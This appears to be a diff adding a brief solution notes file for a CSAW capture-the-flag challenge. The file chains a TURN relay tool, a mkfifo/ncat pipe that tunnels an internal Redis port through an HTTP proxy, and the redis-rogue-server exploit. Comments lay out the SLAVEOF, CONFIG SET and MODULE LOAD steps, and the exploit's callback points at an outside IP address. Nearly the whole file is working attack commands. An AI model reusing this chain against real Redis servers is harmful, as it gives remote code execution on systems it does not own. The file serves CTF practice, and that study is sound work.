@@ -1,0 +1,22 @@
+# Connect to TURN
+./turner -server web.chal.csaw.io:3478 -u '' -p ''
+
+# Test
+curl -x http://localhost:8080 http://0.0.0.0:5000
+
+# Forward remote port 6379 to my port 1337
+rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|ncat -lkp 1337 2>&1 |ncat --proxy-type http --proxy localhost:8080 0.0.0.0 6379 > /tmp/f
+
+# Test
+printf "INFO Server\r\n" | nc localhost 1337 -vvv
+
+# Source: https://github.com/n0b0dyCN/redis-rogue-server
+# Modify Exploit
+# SLAVEOF {lhost} {lport}
+# CONFIG SET dir /tmp
+# CONFIG SET dbfilename {SERVER_EXP_MOD_FILE}
+# MODULE LOAD /tmp/{SERVER_EXP_MOD_FILE}
+# lport does not matter
+./redis-rogue-server.py --rhost 127.0.0.1 --rport 1337 --lhost 140.113.24.143 --lport 9001 -v
+
+Try many times due to poor network
